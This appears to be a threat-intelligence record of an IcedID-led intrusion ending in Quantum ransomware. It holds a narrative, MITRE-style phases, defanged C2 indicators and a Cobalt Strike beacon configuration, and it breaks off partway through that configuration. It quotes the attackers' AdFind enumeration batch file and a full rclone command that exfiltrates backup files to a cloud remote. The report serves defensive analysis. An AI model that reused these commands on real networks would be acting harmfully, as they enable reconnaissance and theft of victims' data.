@@ -1,0 +1,2273 @@
+{
+ "contacts": [
+  {
+   "account": "goodvibe888@proton.me",
+   "flag": "fake",
+   "service": null,
+   "type": "email"
+  }
+ ],
+ "countries": [],
+ "createdAt": "2023-07-20T16:55:33+03:00",
+ "cveList": [
+  {
+   "dateModified": "2026-06-17T03:01:29+00:00",
+   "datePublished": "2020-08-17T19:13:05+00:00",
+   "evaluation": {
+    "admiraltyCode": "A1",
+    "credibility": 100,
+    "reliability": 100,
+    "severity": "red",
+    "tlp": "green",
+    "ttl": 30
+   },
+   "name": "CVE-2020-1472",
+   "products": [
+    {
+     "vendor": "microsoft",
+     "product": "windows_server"
+    }
+   ]
+  }
+ ],
+ "dateFirstSeen": "2022-09-19",
+ "dateLastSeen": "2022-09-30",
+ "datePublished": "2023-09-20",
+ "description": "<p>The intrusion began with the execution of the IcedID malware, which was concealed within an ISO image. This ISO file was delivered to the victim as part of a malspam campaign. The use of ISO images to deliver payloads has become increasingly common among threat actors seeking to evade security controls such as Mark-of-the-Web.</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/a03d40804c5448bba02e9ab43df4420e7d945fd27e81b2145b54e0bab2985cf5?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:a03d40804c5448bba02e9ab43df4420e7d945fd27e81b2145b54e0bab2985cf5_IMAGE__\"  /></p><p>Upon opening the ISO image, a hidden directory containing the IcedID payload and a batch file was revealed. When the victim clicked on the malicious LNK file within the virtual hard drive, it triggered the execution of the batch file. This batch file copied the IcedID payload to the user's AppData\\Local\\Temp folder and loaded it using rundll32. Simultaneously, a scheduled task was created to maintain persistence on the compromised host.</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/b8a34c10e2d3ba994188b40211e8b58a4f8966b08204c081e5dcfa447464251e?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:b8a34c10e2d3ba994188b40211e8b58a4f8966b08204c081e5dcfa447464251e_IMAGE__\"  /></p><p>After the execution of the IcedID payload, the attackers initiated various discovery commands using Windows utilities, including net, nltest, and ipconfig, to gather information about the domain, domain trusts, domain admins, and workstation configurations. Approximately 16 hours after the initial execution, the attackers executed the first Cobalt Strike beacon DLL from the IcedID malware, leading to additional discovery using net and AdFind.</p><p>During AD enumeration, the operator utilized the PowerShell Get-Help cmdlet to troubleshoot the following commands:</p><pre><code class=\"language-plaintext\">powershell.exe Get-Help Export-CSV\npowershell.exe Get-Help Get-ADComputer</code></pre><p>Furthermore, two file-sharing websites, specifically dropmefiles[.]com and file[.]io, were employed to access files. Both of these services were accessed on the second day from one Domain Controller on the network, primarily for downloading various tools and scripts. Subsequently, on the third day, a second Domain Controller was observed accessing the dropmefiles[.]com domain.</p><p>A more comprehensive examination of the WebCacheV01.dat on the domain controllers revealed additional insights into the visited sites, as well as the files that were downloaded from these websites:</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/6d4e404c2b6eac2588d3ebcdb705e8bb42a36249da501dd0a9af593e05cc1865?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:6d4e404c2b6eac2588d3ebcdb705e8bb42a36249da501dd0a9af593e05cc1865_IMAGE__\"  /></p><p>The threat actors downloaded the lsass.exe beacon from their infrastructure hosted at 199[.]127[.]60[.]117.</p><p>The threat actors further escalated their activities by installing remote access software, Atera, and Splashtop via an MSI file. They attempted to exploit the CVE-2020-1472 (ZeroLogon) vulnerability but were thwarted by antivirus software. Subsequently, they used a batch script to perform DNS lookups on various hosts across the environment. Lateral movement was initiated when the attackers copied their Cobalt Strike DLL to a server within the network and executed it via a remote service. The installation of remote access software was repeated.</p><p>Several hours later, another Cobalt Strike beacon was executed, allowing the threat actors to elevate privileges to SYSTEM on the compromised host and dump LSASS memory. They continued their actions using system tools, batch files, and Adget. Multiple beacons were loaded onto the host using DLLs and PowerShell.</p><p>At this stage, the threat actors obtained clear-text credentials for one of the domain administrator accounts, enabling them to move laterally to other systems. They issued remote commands using WMIC for discovery and attempted to distribute and execute Cobalt Strike beacons. However, these actions failed to launch a beacon on the targeted domain controller.</p><p>Faced with repeated failures, the threat actors resorted to RDP access on the domain controller. From there, they downloaded Cobalt Strike PowerShell code from the site textbin[.]net and attempted to execute it locally, which also failed. They then attempted to download various beacon executables (e.g., lsass.exe, lsasss.exe) but continued to experience crashes and failures.</p><p>Approximately one hour into the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain. Subsequently, the Cobalt Strike beacons successfully executed on the domain controller. With Cobalt Strike beacons active on the domain controller, the threat actors continued their discovery actions using tools like Invoke-ShareFinder and various PowerShell and system utilities.</p><p>Several hours later, the threat actors installed RSAT tools on the beachhead host, although they appeared unfamiliar with the tools and had to consult the help menu before using them to collect information about hosts in the environment.</p><p>Back on the domain controller, the threat actors utilized ProcDump to dump LSASS memory and collected logon events for all domain administrators in the network using the PowerShell command Get-EventLog.</p><p>Following a period of inactivity lasting approximately seven hours, the threat actors resumed their activities by launching more Cobalt Strike beacons and executing various Mimikatz implementations on the domain controller, including both binary and PowerShell versions. This activity persisted for several hours and included repeating previous discovery actions and launching additional beacons using remote WMIC commands.</p><p>During this phase, Windows event logs indicated that the threat actors executed DCSync activities on one of the domain controllers. They also executed a batch file named localdisk.bat using remote WMI commands to collect disk data on hosts throughout the environment. These discovery actions were repeated multiple times using various batch files.</p><p>On the fourth day of the intrusion, the threat actors continued their discovery and beacon-spreading activities. Toward the end of the day, they proceeded to install AnyDesk on several servers, including a backup management host, possibly as an additional means of persistence or future command and control.</p><p>Subsequently, the threat actors used PowerShell to display an alert message on multiple hosts, informing users of the Cobalt Strike infection. Afterward, they used Rclone to exfiltrate copies of backup files to the Mega[.]io cloud storage service.</p><p>Although the threat actors staged a ransomware binary on the backup server, they did not immediately execute it. Instead, they waited for approximately two hours before executing it using a command line argument that included a list of target hosts. However, this initial execution attempt failed, prompting the threat actors to manually execute the ransomware payload in various ways across different hosts.</p><p>Finally, the threat actors connected to a domain controller and dropped three scripts. One script copied the ransomware executable to all hosts, another reset every user's password in the organization, and the third executed the staged ransomware payload using PsExec.</p><p>Upon execution, the ransomware left a ransom note named README_TO_DECRYPT.html, attributing the intrusion to Quantum ransomware. The time elapsed from the initial IcedID infection to the ransomware attack was slightly over 78 hours, during which all domain-joined systems were encrypted with Quantum ransomware.</p><h3>Execution</h3><p>The intrusion began with the execution of the IcedID malware, which was delivered within an ISO image. This ISO file was distributed to the victim as part of a malspam campaign. The use of ISO images for payload delivery is a common evasion technique employed by threat actors to bypass Mark-of-the-Web controls. When the victim clicked on the ISO file, it created a hidden directory containing the IcedID payload and a batch file. An LNK file named \"documents\" was visible to the user, and clicking on it triggered the batch file's execution. The batch file copied the IcedID payload to the user's AppData\\Local\\Temp folder and loaded it using rundll32.exe. Concurrently, a scheduled task was created to maintain persistence on the compromised host.</p><p>&nbsp;</p><h3>Discovery</h3><p>Upon execution of the IcedID payload, the threat actors initiated various discovery commands using Windows utilities such as net, nltest, and ipconfig. These commands aimed to gather information about domain trusts, domain administrators, workstation configurations, and other network details. Approximately 16 hours after the initial execution, the first Cobalt Strike beacon DLL was executed from the IcedID malware, leading to another round of discovery using net and AdFind.</p><p>&nbsp;</p><h3>Persistence</h3><p>The threat actors established persistence by creating a scheduled task that utilized a DLL named Utucka.dll. This scheduled task ran every hour and loaded the DLL using rundll32.exe.</p><p>&nbsp;</p><p>Privilege Escalation</p><p>To escalate privileges, the threat actors employed multiple techniques, including named pipe impersonation, WinLogon token impersonation/theft, and an attempt to exploit the CVE-2020-1472 vulnerability (ZeroLogon). While some privilege escalation attempts were blocked by antivirus software, others were successful.</p><p>&nbsp;</p><h3>Defense Evasion</h3><p>The threat actors employed several defense evasion tactics, including bypassing Mark-of-the-Web controls, tampering with Windows Defender, and using process injection techniques. They also attempted to clear the way for their activities by running a command to uninstall Windows Defender GUI.</p><p>&nbsp;</p><h3>Credential Access</h3><p>The threat actors used various tools and scripts to access and collect credentials from compromised hosts. This included the use of Mimikatz in binary and PowerShell forms, as well as DCSync to dump credentials. Several attempts were made to access and dump LSASS memory for credential harvesting.</p><p>&nbsp;</p><h3>Lateral Movement</h3><p>After obtaining clear-text credentials for a domain administrator account, the threat actors began moving laterally within the network. They used WMIC to conduct discovery and executed remote commands to distribute and execute Cobalt Strike beacons on other systems.</p><p>&nbsp;</p><h3>Impact</h3><p>The attack culminated in the deployment of Quantum ransomware across all domain-connected systems. This resulted in the encryption of critical data and systems, causing significant disruption and potential data loss.</p><p>&nbsp;</p><h2>Other tools</h2><p>In the course of the intrusion, the threat actors employed a range of additional tools and scripts, further escalating the complexity and impact of their actions. Some of the noteworthy tools and activities are detailed below:</p><p>ns.bat Script Among the various binaries and scripts introduced to one endpoint, the 'ns.bat' file stands out. This script executed thousands of 'nslookup' commands, each targeting a specific hostname from the network. The outputs of these commands were aggregated into an 'ns.txt' file.</p><p>ADGet - Active Directory Enumeration Tool The threat actors deployed an uncommon but effective Active Directory collection tool named ADGet. This tool was placed in a user's temporary folder and executed with an output filename parameter. ADGet was user-friendly, invoked through the command line, and allowed for specifying an output file to save enumerated Active Directory objects.</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/0f6a7871984ffd785bcb000d67423eb67505454acbc3d0bf00bbeb0915346c64?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:0f6a7871984ffd785bcb000d67423eb67505454acbc3d0bf00bbeb0915346c64_IMAGE__\"  /></p><p>ADGet differed from the more commonly known ADfind tool in that it did not rely on LDAP queries passed as parameters; instead, the queries were coded directly into the binary itself. When configured with its default settings, ADGet generated a zip output file containing several TSV (tab-separated value) files. These files could be viewed using any editor or reader that supports CSV or TSV formats.</p><p>ADfind Before using ADGet, the threat actors leveraged the well-established ADfind tool. They renamed it to 'find.exe' and executed it using a batch file named 'find.bat' dropped into the ProgramData folder on one host. The 'find.bat' file contained a series of commands to query Active Directory objects, such as users, computers, organizational units, subnets, groups, and trust relationships.</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/41bb07540f9634ad22328ef9a765d71ac5ecc51aa2a9c8e7a43e38b0a11947e2?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:41bb07540f9634ad22328ef9a765d71ac5ecc51aa2a9c8e7a43e38b0a11947e2_IMAGE__\"  /></p><p>AD.bat:</p><pre><code class=\"language-plaintext\">for /f \"delims=\" %%A in ('dir /s /b %WINDIR%\\system32\\*htable.xsl') do set \"var=%%A\"\nadfind.exe -f (objectcategory=person) &gt; ad_users.txt\nadfind.exe -f objectcategory=computer &gt; ad_computers.txt\nadfind.exe -f objectcategory=computer -csv name operatingSystem &gt; ad_computers_enum.txt\nadfind.exe -f (objectcategory=organizationalUnit) &gt; ad_ous.txt\nadfind.exe -subnets -f (objectCategory=subnet) &gt; ad_subnets.txt\nadfind.exe -f \"(objectcategory=group)\" &gt; ad_group.txt\nadfind.exe -gcb -sc trustdmp &gt; ad_trustdmp.txt</code></pre><p>Notably, the first line of the batch file specified the WMI output configuration in HTML form, although this HTML was never utilized during the intrusion. It is possible that this code was borrowed or repurposed from other open-source penetration testing scripts.</p><p>WMIC (Windows Management Instrumentation Command-Line) The threat actors utilized the 'WMIC' command through a batch file named 'dS.bat.' This batch file queried multiple target hosts to determine their disk drive configurations, including any mounted network shares. The 'dS.bat' file was executed through the injected 'Rundll32.exe' process.</p><p>WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/5e53895963ec41c55b4b19dab7bc9cd1b70424d048d4793276712627bc4d3228?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:5e53895963ec41c55b4b19dab7bc9cd1b70424d048d4793276712627bc4d3228_IMAGE__\"  /></p><p>Microsoft Management Console for Viewing Group Policy During the intrusion, the threat actors accessed the Group Policy using the Microsoft Management Console application. This action allowed them to review Domain Group Policy Objects, potentially yielding valuable information regarding host configurations and restrictions within the network.</p><p>Lateral Movement To move laterally within the network, the threat actors employed several methods and tools:</p><ul><li>WMI (Windows Management Instrumentation): The threat actors used 'wmic.exe' to execute PowerShell Cobalt Strike beacons on multiple workstations and servers. These payloads were hosted on 'textbin[.]net,' enabling the threat actors to establish control over remote systems.</li><li>Remote Desktop Protocol (RDP): The threat actors used a variety of processes, including beacon injection and standalone processes like 'Nigu.exe' and 'lsass.exe,' to initiate RDP connections. During these sessions, they often launched Internet Explorer to download additional beacons or execute commands.</li><li>Remote Services: Remote services were created to facilitate the propagation of Cobalt Strike beacons across the network. Notably, AnyDesk was employed for lateral movement between a workstation and a backup server.</li></ul><p>Data Collection The threat actors actively collected data from multiple hosts using the 'dir' command, which was executed through administrative shares (e.g., c$). The collected data was then redirected to a text file named 'listing.txt.' Additionally, various text files were created to store the output of different discovery commands and scripts on compromised hosts.</p><p>Command and Control The threat actors maintained control over the compromised network using various command and control (C2) servers and tools:</p><p>IcedID: This malware was configured with specific details, including a campaign ID and C2 URL. Initially, it communicated over an unencrypted port (80) before switching to TLS on port 443. Several IP addresses were used for C2 communication.</p><p>&nbsp;</p><figure class=\"table\"><table><tbody><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">destination.ip</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">destination.port</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">tls.client.ja3</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">tls.server.ja3s</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">zeek[.]ssl[.]server[.]name</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">Count</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">5[.]196[.]103[.]145</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ec74a5c51106f0419184d0dd08fb05bc</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">choifejuce[.]lol</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">373</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">5[.]196[.]103[.]145</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ec74a5c51106f0419184d0dd08fb05bc</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">erinindiaka[.]quest</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">1</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">46[.]101[.]19[.]119</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ec74a5c51106f0419184d0dd08fb05bc</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">opiransiuera[.]com</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">278</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">178[.]128[.]85[.]30</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ec74a5c51106f0419184d0dd08fb05bc</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">zoomersoidfor[.]com</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">4</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">5[.]252[.]177[.]10</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ec74a5c51106f0419184d0dd08fb05bc</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">considerf[.]info</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">1</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">66[.]63[.]188[.]70</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ec74a5c51106f0419184d0dd08fb05bc</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">antiflamez[.]bar</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">1</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">155[.]138[.]159[.]45</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ec74a5c51106f0419184d0dd08fb05bc</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">www[.]onlinecloud[.]cloud</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">1</td></tr></tbody></table></figure><p>&nbsp;</p><p>Cobalt Strike: Multiple Cobalt Strike beacons were deployed across the network, each employing recognizable default configurations. These beacons established outbound connections to C2 servers, leading to a significant increase in network traffic. The threat actors used different methods to deploy these beacons, including executables, DLLs, and PowerShell.</p><p>&nbsp;</p><figure class=\"table\"><table><tbody><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">destination.ip</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">destination.port</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">tls.client.ja3</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">tls.client.ja3s</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">zeek[.]ssl[.]server[.]name</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">172[.]93[.]181[.]165</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ae4edc6faf64d08308082ad26be60767</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">fazehotafa[.]com</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">45[.]66[.]151[.]109</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">a0e9f5d64349fb13191bc781f81f42e1</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ae4edc6faf64d08308082ad26be60767</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">guteyutur[.]com</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">111[.]90[.]143[.]191</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">72a589da586844d7f0818ce684948eea</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">ae4edc6faf64d08308082ad26be60767</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">–</td></tr><tr><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">78[.]128[.]112[.]139</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">443</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">72a589da586844d7f0818ce684948eea</td><td style=\"border:0.75pt solid #424242;padding:5pt;vertical-align:top;\">f176ba63b4d68e576b5ba345bec2c7b7</td><td style=\"border-bottom-color:#424242;border-left-color:#424242;border-right-color:#ebebeb;border-style:solid;border-top-color:#424242;border-width:0.75pt;padding:5pt;vertical-align:top;\">–</td></tr></tbody></table></figure><p>&nbsp;</p><p>Remote Access Software Curiously, the threat actor employed three different remote access tools:</p><ul><li>Atera</li><li>Splashtop</li><li>AnyDesk</li></ul><p>The reasons for using these multiple tools for establishing command and control channels remain unclear.</p><p>Exfiltration During the intrusion, the threat actors accessed and copied collected data, such as 'ShareFinder.txt,' using Notepad and the clipboard. They correlated this activity with Active Directory accounts and clipboard events, enabling them to track the source of the user involved. Exfiltration of documents was observed, and the threat actors utilized the tool 'Rclone' to transfer data to a MEGA cloud storage account.</p><p>Rclone command:</p><pre><code class=\"language-plaintext\">rclone.exe&nbsp; copy --max-age 5y \"\\\\[REDACTED BACKUP]\\E:\\[REDACTED]\\\" remote:Groups --exclude \"*.{psd,7z,dwg,rar,MTS,MOV,pst,PRF,mp3,skp,tmp,gcp,zip,ZIP,MP4,tiff,ava4,psb,tif,DNG,AVI,FIT,FIL,mp4,dxf,mov,rcs,mdb,iso,json,man,exe,gz,ISO,dll,BAK,bak,tib,MP3,tar,m4v,vmdk,vm,PBD,db,BAKDB,icon,msi,ai,gif,cab,iso,png,eps,lib,avi,msg,crs,LIB,CRS,mpg,dcm,tif}\" -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P</code></pre><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/3089ff98aa7cf56a83c6ed0f64f098763e3106bb86e07a008c3496f13975fe78?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:3089ff98aa7cf56a83c6ed0f64f098763e3106bb86e07a008c3496f13975fe78_IMAGE__\"  /></p><p>Impact As the intrusion progressed, the threat actors took increasingly bold actions:</p><p>Alert Message: At one point, the threat actor issued an alert message to inform end-users of the compromise, specifically mentioning Cobalt Strike. This occurred several hours before the execution of ransomware, adding an element of uncertainty to their motivations.</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/874dacb8a7630737e76649e63c933caaf0fd8cc2bd864252d631cd5dcf6bee77?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:874dacb8a7630737e76649e63c933caaf0fd8cc2bd864252d631cd5dcf6bee77_IMAGE__\"  /></p><p>Ransomware: On the fourth day of the intrusion, the threat actors introduced their ransomware, beginning with the deployment of 'locker_64.exe' on a backup server. Subsequently, they attempted to execute this ransomware on various hosts within the network. In addition, they reset all user accounts in the domain to a single password, further hampering recovery efforts.</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/55fa7bf793ded72882fdb88ec7961d1ae4087c264b2fdd1b59900ec9d589fd23?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:55fa7bf793ded72882fdb88ec7961d1ae4087c264b2fdd1b59900ec9d589fd23_IMAGE__\"  /></p><p>Screenshot of the ransom note:</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/b4728b9cdecdbf4813a107926a571662a8aa1d6c0fba099d1504ea324416311f?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:b4728b9cdecdbf4813a107926a571662a8aa1d6c0fba099d1504ea324416311f_IMAGE__\"  /></p><p>Diamon model:</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/e91d113e573b1c7de0b4eac36a6e47d897e28cab805d4f8d262aa16830bf455c?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:e91d113e573b1c7de0b4eac36a6e47d897e28cab805d4f8d262aa16830bf455c_IMAGE__\"  /></p><p>Timeline of the attack:</p><p><img src=\"/api/v2/hi/threat/9f4e535fcdbbd35cb49b04f03cfaccf33e312942/file/ff65ffe2e1a9f88c6020457722de20a2236b3f0bc3c6d9c35c15deb579c917b4?placeholder=__IMAGE_9f4e535fcdbbd35cb49b04f03cfaccf33e312942:ff65ffe2e1a9f88c6020457722de20a2236b3f0bc3c6d9c35c15deb579c917b4_IMAGE__\"  /></p><p><br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2>Cobalt Strike configurations</h2><p>172[.]93[.]181[.]165</p><pre><code class=\"language-plaintext\">{\n  \"beacontype\": [\n    \"HTTPS\"\n  ],\n  \"sleeptime\": 5000,\n  \"jitter\": 28,\n  \"maxgetsize\": 1865903,\n  \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n  \"license_id\": 0,\n  \"cfg_caution\": false,\n  \"kill_date\": null,\n  \"server\": {\n    \"hostname\": \"fazehotafa[.]com\",\n    \"port\": 443,\n    \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC1nAS8+PqMnQs3hynG2JDgMQK6ZqLkIoDXWnqaOS/dQsdKBHE0Ify/HIZ2ntSpyMtvomDHCA98pCEi1L7mT0mvfiYapP9Aj776rDpzXMYNiRk1BWrAzJqzLcfwzxJx26hL1VSu1C5mWEl7JsVT/9l/kHcNYAALgNQuI0uZAqM7YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"\n  },\n  \"host_header\": \"\",\n  \"useragent_header\": null,\n  \"http-get\": {\n    \"uri\": \"/ak.css\",\n    \"verb\": \"GET\",\n    \"client\": {\n      \"headers\": null,\n      \"metadata\": null\n    },\n    \"server\": {\n      \"output\": [\n        \"print\",\n        \"prepend 1767 characters\",\n        \"base64\",\n        \"base64url\"\n      ]\n    }\n  },\n  \"http-post\": {\n    \"uri\": \"/profile\",\n    \"verb\": \"POST\",\n    \"client\": {\n      \"headers\": null,\n      \"id\": null,\n      \"output\": null\n    }\n  },\n  \"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"crypto_scheme\": 0,\n  \"proxy\": {\n    \"type\": null,\n    \"username\": null,\n    \"password\": null,\n    \"behavior\": \"Use IE settings\"\n  },\n  \"http_post_chunk\": 0,\n  \"uses_cookies\": true,\n  \"post-ex\": {\n    \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n    \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\"\n  },\n  \"process-inject\": {\n    \"allocator\": \"VirtualAllocEx\",\n    \"execute\": [\n      \"CreateThread\",\n      \"CreateRemoteThread\",\n      \"RtlCreateUserThread\"\n    ],\n    \"min_alloc\": 9369,\n    \"startrwx\": false,\n    \"stub\": \"Ms1B7fCBDFtfSY7fRzHMbQ==\",\n    \"transform-x86\": [\n      \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\"\n    ],\n    \"transform-x64\": [\n      \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\"\n    ],\n    \"userwx\": false\n  },\n  \"dns-beacon\": {\n    